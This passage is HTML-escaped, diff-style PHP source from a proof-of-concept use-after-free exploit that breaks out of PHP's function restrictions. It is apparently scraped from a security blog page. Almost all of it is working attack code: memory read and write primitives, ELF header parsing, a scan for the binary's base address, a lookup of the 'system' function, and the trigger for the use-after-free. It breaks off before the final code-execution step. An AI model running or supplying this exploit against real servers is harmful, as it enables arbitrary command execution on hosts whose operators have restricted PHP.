+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">ptr2str&lt;/span>($ptr, $m &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $out &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ($i&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>; $i &lt;span style="color:#f92672">&amp;lt;&lt;/span> $m; $i&lt;span style="color:#f92672">++&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $out &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#a6e22e">chr&lt;/span>($ptr &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xff&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ptr &lt;span style="color:#f92672">&amp;gt;&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> $out;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">write&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>$str, $p, $v, $n &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>($i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; $i &lt;span style="color:#f92672">&amp;lt;&lt;/span> $n; $i&lt;span style="color:#f92672">++&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $str[$p &lt;span style="color:#f92672">+&lt;/span> $i] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">chr&lt;/span>($v &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xff&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $v &lt;span style="color:#f92672">&amp;gt;&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($addr, $p &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>, $s &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">global&lt;/span> $abc, $helper;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">write&lt;/span>($abc, &lt;span style="color:#ae81ff">0x68&lt;/span>, $addr &lt;span style="color:#f92672">+&lt;/span> $p &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $leak &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">strlen&lt;/span>($helper&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>($s &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) { $leak &lt;span style="color:#f92672">%=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> ($s &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>; }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> $leak;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">parse_elf&lt;/span>($base) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $e_type &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($base, &lt;span style="color:#ae81ff">0x10&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $e_phoff &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($base, &lt;span style="color:#ae81ff">0x20&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $e_phentsize &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($base, &lt;span style="color:#ae81ff">0x36&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $e_phnum &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($base, &lt;span style="color:#ae81ff">0x38&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>($i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; $i &lt;span style="color:#f92672">&amp;lt;&lt;/span> $e_phnum; $i&lt;span style="color:#f92672">++&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $header &lt;span style="color:#f92672">=&lt;/span> $base &lt;span style="color:#f92672">+&lt;/span> $e_phoff &lt;span style="color:#f92672">+&lt;/span> $i &lt;span style="color:#f92672">*&lt;/span> $e_phentsize;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $p_type &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($header, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $p_flags &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($header, &lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $p_vaddr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($header, &lt;span style="color:#ae81ff">0x10&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $p_memsz &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($header, &lt;span style="color:#ae81ff">0x28&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>($p_type &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> $p_flags &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>) { &lt;span style="color:#75715e"># PT_LOAD, PF_Read_Write
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e"># handle pie
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $data_addr &lt;span style="color:#f92672">=&lt;/span> $e_type &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">?&lt;/span> $p_vaddr &lt;span style="color:#f92672">:&lt;/span> $base &lt;span style="color:#f92672">+&lt;/span> $p_vaddr;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $data_size &lt;span style="color:#f92672">=&lt;/span> $p_memsz;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>($p_type &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> $p_flags &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>) { &lt;span style="color:#75715e"># PT_LOAD, PF_Read_exec
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $text_size &lt;span style="color:#f92672">=&lt;/span> $p_memsz;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>$data_addr &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>$text_size &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>$data_size)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> [$data_addr, $text_size, $data_size];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">get_basic_funcs&lt;/span>($base, $elf) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">list&lt;/span>($data_addr, $text_size, $data_size) &lt;span style="color:#f92672">=&lt;/span> $elf;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>($i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; $i &lt;span style="color:#f92672">&amp;lt;&lt;/span> $data_size &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>; $i&lt;span style="color:#f92672">++&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $leak &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($data_addr, $i &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>($leak &lt;span style="color:#f92672">-&lt;/span> $base &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> $leak &lt;span style="color:#f92672">-&lt;/span> $base &lt;span style="color:#f92672">&amp;lt;&lt;/span> $data_addr &lt;span style="color:#f92672">-&lt;/span> $base) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $deref &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($leak);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># &amp;#39;constant&amp;#39; constant check
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>($deref &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0x746e6174736e6f63&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">continue&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $leak &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($data_addr, ($i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>($leak &lt;span style="color:#f92672">-&lt;/span> $base &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> $leak &lt;span style="color:#f92672">-&lt;/span> $base &lt;span style="color:#f92672">&amp;lt;&lt;/span> $data_addr &lt;span style="color:#f92672">-&lt;/span> $base) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $deref &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($leak);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># &amp;#39;bin2hex&amp;#39; constant check
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>($deref &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0x786568326e6962&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">continue&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> $data_addr &lt;span style="color:#f92672">+&lt;/span> $i &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">get_binary_base&lt;/span>($binary_leak) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $base &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $start &lt;span style="color:#f92672">=&lt;/span> $binary_leak &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xfffffffffffff000&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>($i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; $i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x1000&lt;/span>; $i&lt;span style="color:#f92672">++&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $addr &lt;span style="color:#f92672">=&lt;/span> $start &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x1000&lt;/span> &lt;span style="color:#f92672">*&lt;/span> $i;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $leak &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($addr, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">7&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>($leak &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x10102464c457f&lt;/span>) { &lt;span style="color:#75715e"># ELF header
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> $addr;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">get_system&lt;/span>($basic_funcs) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $addr &lt;span style="color:#f92672">=&lt;/span> $basic_funcs;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $f_entry &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($addr);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $f_name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($f_entry, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>($f_name &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x6d6574737973&lt;/span>) { &lt;span style="color:#75715e"># system
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($addr &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $addr &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">while&lt;/span>($f_entry &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">trigger_uaf&lt;/span>($arg) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># str_shuffle prevents opcache string interning
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $arg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">str_shuffle&lt;/span>(&lt;span style="color:#a6e22e">str_repeat&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">79&lt;/span>));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $vuln &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Vuln&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $vuln&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> $arg;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">stristr&lt;/span>(&lt;span style="color:#66d9ef">PHP_OS&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;WIN&amp;#39;&lt;/span>)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;This PoC is for *nix systems only.&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $n_alloc &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>; &lt;span style="color:#75715e"># increase this value if UAF fails
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $contiguous &lt;span style="color:#f92672">=&lt;/span> [];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>($i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; $i &lt;span style="color:#f92672">&amp;lt;&lt;/span> $n_alloc; $i&lt;span style="color:#f92672">++&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $contiguous[] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">str_shuffle&lt;/span>(&lt;span style="color:#a6e22e">str_repeat&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">79&lt;/span>));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">trigger_uaf&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;x&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $abc &lt;span style="color:#f92672">=&lt;/span> $backtrace[&lt;span style="color:#ae81ff">1&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;args&amp;#39;&lt;/span>][&lt;span style="color:#ae81ff">0&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $helper &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Helper&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $helper&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> ($x) { };
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">strlen&lt;/span>($abc) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">79&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#a6e22e">strlen&lt;/span>($abc) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;UAF failed&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># leaks
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $closure_handlers &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">str2ptr&lt;/span>($abc, &lt;span style="color:#ae81ff">0&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $php_heap &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">str2ptr&lt;/span>($abc, &lt;span style="color:#ae81ff">0x58&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $abc_addr &lt;span style="color:#f92672">=&lt;/span> $php_heap &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0xc8&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># fake value
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">write&lt;/span>($abc, &lt;span style="color:#ae81ff">0x60&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">write&lt;/span>($abc, &lt;span style="color:#ae81ff">0x70&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># fake reference
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">write&lt;/span>($abc, &lt;span style="color:#ae81ff">0x10&lt;/span>, $abc_addr &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x60&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">write&lt;/span>($abc, &lt;span style="color:#ae81ff">0x18&lt;/span>, &lt;span style="color:#ae81ff">0xa&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $closure_obj &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">str2ptr&lt;/span>($abc, &lt;span style="color:#ae81ff">0x20&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $binary_leak &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($closure_handlers, &lt;span style="color:#ae81ff">8&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>($base &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">get_binary_base&lt;/span>($binary_leak))) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Couldn&amp;#39;t determine binary base address&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
